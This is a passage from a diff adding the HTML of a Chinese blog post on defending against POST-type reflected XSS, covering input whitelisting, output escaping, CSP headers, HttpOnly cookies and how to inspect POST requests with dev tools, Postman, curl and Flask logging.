+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">validate_username</span><span class="p">(</span><span class="n">username</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 白名单正则：仅允许 a-z、A-Z、0-9、_</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">re</span><span class="o">.</span><span class="k">match</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;^[a-zA-Z0-9_]{1,20}$&#39;</span><span class="p">,</span> <span class="n">username</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">username</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;非法用户名&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="3-禁用危险操作前端后端">3. 禁用危险操作（前端+后端）
+</h3><ul>
+<li>后端：禁止将用户输入直接拼接到 HTML 响应中，优先使用模板引擎（如 Jinja2、Thymeleaf）—— 模板引擎默认会转义变量；</li>
+<li>前端：避免使用 <code>innerHTML</code>/<code>document.write</code> 渲染后端返回的内容，优先用 <code>textContent</code>。</li>
+</ul>
+<h3 id="4-开启-csp内容安全策略">4. 开启 CSP（内容安全策略）
+</h3><p>通过 HTTP 响应头限制 JS 执行，从根本上阻止内联脚本：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err"># 仅允许加载本站的 JS，禁止内联脚本、eval
+</span></span></span><span class="line"><span class="cl"><span class="err">Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39;; style-src &#39;self&#39;; img-src &#39;self&#39;
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="flask-中配置-csp-示例">Flask 中配置 CSP 示例：
+</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nd">@app.after_request</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">add_csp</span><span class="p">(</span><span class="n">response</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">response</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">&#39;Content-Security-Policy&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&#34;default-src &#39;self&#39;; script-src &#39;self&#39;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">response</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="5-cookie-配置-httponly">5. Cookie 配置 HttpOnly
+</h3><p>即使存在 XSS 漏洞，也能阻止恶意代码窃取 Cookie：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Flask 中设置 Cookie HttpOnly</span>
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/set_cookie&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">set_cookie</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">response</span> <span class="o">=</span> <span class="n">make_response</span><span class="p">(</span><span class="s2">&#34;Cookie set&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># HttpOnly=True 禁止 JS 读取 Cookie</span>
+</span></span><span class="line"><span class="cl">    <span class="n">response</span><span class="o">.</span><span class="n">set_cookie</span><span class="p">(</span><span class="s1">&#39;session_id&#39;</span><span class="p">,</span> <span class="s1">&#39;123456&#39;</span><span class="p">,</span> <span class="n">httponly</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">secure</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">response</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="四实战防御总结落地优先级">四、实战防御总结（落地优先级）
+</h2><ol>
+<li><strong>输出转义</strong>：所有用户输入（无论 GET/POST）输出到 HTML 前必须转义，这是最核心的防御手段；</li>
+<li><strong>CSP 策略</strong>：开启严格的 CSP，即使漏防也能阻止恶意脚本执行；</li>
+<li><strong>Cookie HttpOnly</strong>：保底措施，防止核心凭证（Cookie）被窃取；</li>
+<li><strong>输入白名单</strong>：减少恶意代码注入的可能性，辅助防御。</li>
+</ol>
+<h3 id="总结">总结
+</h3><ol>
+<li>反射型 XSS（POST 型）核心是<strong>恶意代码在 POST 请求体中，服务器反射执行</strong>，利用需构造恶意表单，隐蔽性更高；</li>
+<li>和 GET 型 XSS 防御逻辑一致，核心是<strong>输出 HTML 转义 + CSP + Cookie HttpOnly</strong>；</li>
+<li>关键区别：POST 型无法通过 URL 直接利用，需诱导用户提交表单，但其危害和防御优先级与 GET 型完全相同。</li>
+</ol>
+<h2 id="补充post请求介绍及查看方式">补充：POST请求介绍及查看方式
+</h2><p>POST 是 HTTP 协议中最常用的请求方法之一，你可以把它理解成<strong>向服务器「提交/发送数据」的动作</strong>。</p>
+<ul>
+<li>对比理解：GET 请求像是「向服务器要东西」（比如打开网页、查询数据），参数通常暴露在 URL 里；</li>
+<li>POST 请求像是「给服务器送东西」（比如提交表单、上传文件、创建数据），数据放在请求体（Body）中，不会暴露在 URL 里，更适合传输敏感数据（如密码）或大量数据。</li>
+</ul>
+<h3 id="在哪里查看-post-请求">在哪里查看 POST 请求？
+</h3><p>最常用的方式是通过<strong>浏览器开发者工具</strong>或<strong>专门的接口调试工具</strong>（如 Postman），以下是详细步骤：</p>
+<h4 id="1-浏览器开发者工具最常用无需额外安装">1. 浏览器开发者工具（最常用，无需额外安装）
+</h4><p>以 Chrome/Edge 为例，步骤如下：</p>
+<ol>
+<li>打开需要调试的网页，按 <code>F12</code> 或右键 → 检查 → 切换到「Network（网络）」标签；</li>
+<li>勾选「Preserve log（保留日志）」（避免页面刷新丢失请求）；</li>
+<li>触发 POST 请求（比如点击「提交」按钮、登录按钮）；</li>
+<li>在请求列表中找到目标请求（可通过「Filter（筛选）」输入 <code>POST</code> 快速定位）；</li>
+<li>点击该请求，查看关键信息：
+<ul>
+<li><strong>Headers（请求头）</strong>：能看到请求方法（Request Method: POST）、目标 URL、请求头参数（如 Content-Type）；</li>
+<li><strong>Payload/Request Body（请求体）</strong>：这里是 POST 提交的核心数据（比如表单的用户名、密码）；</li>
+<li><strong>Response（响应）</strong>：服务器处理 POST 请求后返回的数据（如成功/失败提示、返回的结果）。</li>
+</ul>
+</li>
+</ol>
+<h4 id="2-接口调试工具开发测试时用">2. 接口调试工具（开发/测试时用）
+</h4><p>如果是自己开发接口，需要主动发送 POST 请求并查看，推荐：</p>
+<ul>
+<li><strong>Postman</strong>（主流）：
+<ol>
+<li>打开 Postman，选择「POST」方法，输入请求 URL；</li>
+<li>在「Body」标签中选择数据格式（如 form-data、raw/JSON），填写要提交的数据；</li>
+<li>点击「Send」发送请求；</li>
+<li>下方「Response」区域可查看服务器返回的状态码、响应体、响应头。</li>
+</ol>
+</li>
+<li><strong>curl 命令（终端）</strong>：
+示例（发送 JSON 格式的 POST 请求）：
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -X POST <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>  https://example.com/api/user <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -H <span class="s2">&#34;Content-Type: application/json&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -d <span class="s1">&#39;{&#34;username&#34;:&#34;test&#34;,&#34;password&#34;:&#34;123456&#34;}&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div>执行后终端会直接返回服务器的响应结果。</li>
+</ul>
+<h4 id="3-后端日志服务器端查看">3. 后端日志（服务器端查看）
+</h4><p>如果你是后端开发者，还可以在服务器代码中打印 POST 请求的信息：
+以 Python Flask 为例：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/submit&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">submit</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 打印 POST 请求的表单数据</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;表单数据：&#34;</span><span class="p">,</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 打印 JSON 格式的请求体</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;JSON 数据：&#34;</span><span class="p">,</span> <span class="n">request</span><span class="o">.</span><span class="n">get_json</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;提交成功&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">debug</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>运行代码后，触发 POST 请求时，终端会输出接收到的 POST 数据。</p>
+<h3 id="总结-1">总结
+</h3><ol>
+<li>POST 请求是「向服务器提交数据」的 HTTP 方法，数据存于请求体，适合传输敏感/大量数据；</li>
+<li>前端查看：用浏览器开发者工具的「Network」标签，筛选 POST 请求，查看 Payload/Response；</li>
+<li>开发/测试查看：用 Postman 主动发送 POST 请求，或用 curl 命令；后端可通过代码打印请求数据。</li>
+</ol>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2026 Loyal
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.26.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/lloyal-sudo01/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
